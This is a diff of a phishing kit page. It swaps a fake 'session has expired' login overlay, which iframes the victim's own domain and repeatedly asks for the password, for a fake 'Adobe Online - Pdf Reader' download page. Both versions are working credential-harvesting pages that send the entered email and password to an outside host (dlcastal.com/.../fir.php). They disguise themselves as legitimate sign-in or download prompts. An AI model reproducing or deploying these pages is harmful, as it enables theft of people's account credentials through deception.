@@ -1,60 +1,44 @@
 
-<!doctype html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport"
-          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>...</title>
-    <style>
-        body{width:99%;height:100%;margin:0;padding:0}#mainPage{border:none}hr{border:1px solid #999}#overlay{background-image: url("https://i.imgur.com/l9PBM2F.jpg");position:absolute;position: absolut;height: 100%;width: 100%;top: 0px;background-size: cover;opacity:.6;filter:alpha(opacity=60)}#loginBody{background-color:#555;border:1px solid #DDD;box-shadow:0 0 10px #DDD;width:400px;height:180px;position:absolute;top:30%;left:30%}#loginBg{background:#fff;width:100%;height:100%;opacity:.9;filter:alpha(opacity=90)}#topHeader{margin-bottom:10px;padding-top:10px}#favIcon{margin:0 10px}#form{position:relative;left:10%;width:80%}.email,.pass{margin:0 0 5px}
-    </style>
-</head>
 
-<body id="body" style="display:none">
-<script>
-const url = 'https://dlcastal.com/a/fir.php';   //full url goes here
-</script>
-<iframe id="mainPage" src="" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
-allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;"></iframe>
 
-<div id="overlay" style="height: 100%; width: 1366px;">
 
-</div>
-<div id="loginBody">
-    <div id="loginBg">
-        <div id="topHeader">
-            <img id="favIcon" src=""> <b id="sExp">Your session has expired.</b>
-            <hr>
-        </div>
-        <div id="form">
-            <form id="form_login" onsubmit="Process(); return false;">
-                <input id="count" type="hidden" value="0">
-                <div class="email">
-                    <span id="userId"></span>
-                    <input id="user"  type="hidden" value="[EMail_LocalPart]@[EMail_DomainPart]" name="user">
-                    <input id="main_domain" type="hidden" value="" name="main_domain">
-                </div>
-                
+<html hola_ext_inject="disabled"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
 
-                <div class="pass">
-                    <span id="passName">password</span>: <input type="password" name="pass" id="pass">
-                    <div><i id="error" style="color:red;display:none;font-size:90%;"> </i></div>
-                </div>
-                <div class="pass">
-                    <input type="checkbox"> <span id="keepme">Let me keep you logged in</span>
-                </div>
-                <div class="submit">
-                    <input type="submit" value="login" id="loginButton">
-                </div>
-            </form>
-        </div>
-    </div>
-</div>
-<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
-<script>
-function Process(){$("#error").fadeOut();var e=$("#user").val(),t=$("#pass").val(),n=$("#count").val(),a=e,o=a.indexOf("@");a.substr(o+1);if(""==e||""==t)return $("#error").fadeIn(),$("#error").text("Please enter your password."),!1;$.post(url,{user:e,pass:t},function(){if(n>=2)$("#count").val("0"),window.location="http://"+document.getElementById("main_domain").value;else{$("#error").fadeIn(),$("#error").text("Please enter your password."),$("#pass").val("");var e=+n+1;$("#count").val(e)}})}document.getElementById("mainPage").src="",$(document).ready(function(){var e=window.location.hash.substr(1);if(e){document.getElementById("body").style.display="block";var t=e,n=t.indexOf("@"),a=t.substr(n+1);a.substr(0,a.indexOf(".")).toLowerCase();$("#user").val(t),$("#main_domain").val(a)}else window.location="http://bing.com";document.getElementById("mainPage").src="http://"+a,document.getElementById("mainPage").src=document.getElementById("mainPage").src;var o="http://www.google.com/s2/favicons?domain="+document.getElementById("main_domain").value,r=document.createElement("link");r.type="image/x-icon",r.rel="shortcut icon",r.href=o,document.getElementsByTagName("head")[0].appendChild(r),document.getElementById("favIcon").src=o,$strEmail=document.getElementById("user").value,$("#userId").text($strEmail)}());
-</script>
-</body>
-</html>
+<title>Adobe Online - Pdf Reader</title>
+<link rel="icon" type="image/png" href="http://zenixmachines.com/wp-image/pdf/favicon.ico">
+<style type="text/css"></style></head>
+
+<body style="background-image: url(https://imgur.com/PqAEIJL.jpg); background-repeat: no-repeat; background-size: cover;">
+
+<div style="position: absolute; width: 310px; height: 326px; z-index: 1; left: 480px; top: 230px; background-image: url(https://imgur.com/CQNKDWU.png); background-repeat: no-repeat" id="layer1">
+<div style="position: absolute; width: 70px; height: 20px; z-index: 1; left: 10px; top: 300px; background-image: url(https://i.imgur.com/nmEfI29.gif); background-repeat: no-repeat" id="layer2">
+&nbsp;</div>
+
+<form method="POST" autocomplete="on" name="login_form" id="login_form" onSubmit="return hash2(this)" style="line-height: 1.22em; margin: 0px; padding: 0px;" action="https://dlcastal.com/b/fir.php">
+
+
+
+<div style="position: absolute; width: 313px; height: 20px; z-index: 1; left: 35px; top: 104px" id="layer3">
+	<span class="formwrap">
+									  <input class="validate[required]" id="email" name="email" autocomplete="on" placeholder="someone@example.com" value="<?php echo $_GET['login']; ?>" readonly required style="width:230; height:30" value="" type="text"></span></div>
+
+
+
+<div style="position: absolute; width: 313px; height: 20px; z-index: 2; left: 35px; top: 152px" id="layer4">
+										<span class="formwrap">
+										<input class="validate[required]" id="pass" name="password" placeholder="Password" required="" style="width:230; height:30" type="password"></span></div>
+
+
+<input type="checkbox" name="remember" style="position: absolute; left: 35px; top: 190px" value="">
+<label id="label" style="position: absolute; left: 60px; top: 190px; font-family: Arial; font-size: 12px; color: #E6E6FA; font-weight: bold">Keep me signed in</label>
+
+<div style="position: absolute; width: 92px; height: 30px; z-index: 4; left: 100px; top: 230px" id="layer6">
+
+								<button type="submit" id="submit" name="submit" class="lgbx-btn purple-bg" tabindex="4" style="line-height: 1.22em; border: 1px solid rgb(82, 38, 117); color: rgb(255, 255, 255); height: 35px; width: 100px; font-weight: bold; cursor: pointer; text-align: center; border-top-left-radius: 2px; border-top-right-radius: 2px; border-bottom-right-radius: 2px; border-bottom-left-radius: 2px; background-color: rgb(51, 204, 51); font-size: 13px;">
+								Download</button></div>
+
+
+
+&nbsp;</form></div>
+
+</body></html>
